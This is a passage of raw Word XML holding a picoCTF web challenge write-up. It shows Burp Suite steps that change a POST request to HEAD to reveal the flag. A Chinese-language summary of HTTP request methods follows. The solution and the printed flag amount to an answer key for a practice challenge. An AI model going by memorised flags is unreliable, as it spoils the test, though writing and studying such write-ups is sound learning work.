                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F322012" w14:textId="78E0737D" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Burp -&gt;proxy-&gt;options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5A4196" w14:textId="55BB816A" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="244C3C2E" wp14:editId="1A81C335">
            <wp:extent cx="5966977" cy="300254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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5966977" cy="3002540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="156094DB" w14:textId="7D0F088F" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="105CF9E3" w14:textId="77777777" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="186F9C04" w14:textId="4987FC51" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>firefox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> launch a webpage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E77DF4" w14:textId="784BC687" w:rsidR="00E50ED3" w:rsidRDefault="00000000" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId51" w:history="1">
        <w:r w:rsidR="00F25C59" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:21939/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E0C2B0C" w14:textId="2F723F96" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00F25C59">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Turn on intercept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B288E71" w14:textId="0C24F37A" w:rsidR="00E50ED3" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Click on blue button</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009D45A6" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F5521C2" w14:textId="44C85B19" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="555B9F61" wp14:editId="5098724E">
            <wp:extent cx="6332220" cy="26320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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2632075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F216C85" w14:textId="7DB818A7" w:rsidR="00222A2A" w:rsidRDefault="00222A2A" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C566516" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Right click it -&gt; send to Repeater</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96A852" w14:textId="44A339E3" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Change Post method to HEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F08598" w14:textId="0E955A99" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Send the request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C15C47" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55E6E08D" w14:textId="1EFDC837" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76C3D116" wp14:editId="51139C3E">
            <wp:extent cx="6332220" cy="20758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6332220" cy="2075815"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F6B735" w14:textId="66271915" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F25C59">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F25C59">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F25C59">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{r3j3ct_th3_du4l1ty_6ef27873}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FA35F7" w14:textId="0DF4F776" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4782AD13" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>请求方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B367F4D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>定义了一组请求方法，以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作。虽然他们也可以是名词，但这些请求方法有时被称为</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>动词。每一个请求方法都实现了不同的语义，但一些共同的特征由一组共享：例如一个请求方法可以是</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> safe, idempotent, </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> cacheable (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>-US)</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BE9F29" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FECE134" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8864BA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法请求一个指定资源的表示形式，使用</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>的请求应该只被用于获取数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048D0F70" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3295E353" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>HEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3EC45D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">HEAD </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法请求一个与</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>请求的响应相同的响应，但没有响应体。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FFFC1F" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04783763" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F189D7" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">POST </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5741AB69" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D59BEBA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F6A868" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">PUT </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用请求有效载荷替换目标资源的所有当前表示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA77884" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56C75EE1" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398FD28D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">DELETE </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法删除指定的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8D4BE1" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10A4DCB8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>CONNECT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB43A7D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">CONNECT </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法建立一个到由目标资源标识的服务器的隧道。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6034975D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C9FAF56" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>OPTIONS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75166D4D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">OPTIONS </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于描述目标资源的通信选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786C14DC" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65693FB8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>TRACE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BE632B" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">TRACE </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法沿着到目标资源的路径执行一个消息环回测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEF1C9F" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2329DBDA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>PATCH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C61C39" w14:textId="1F7D8183" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">PATCH </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于对资源应用部分修改。</w:t>
      </w:r>
    </w:p>
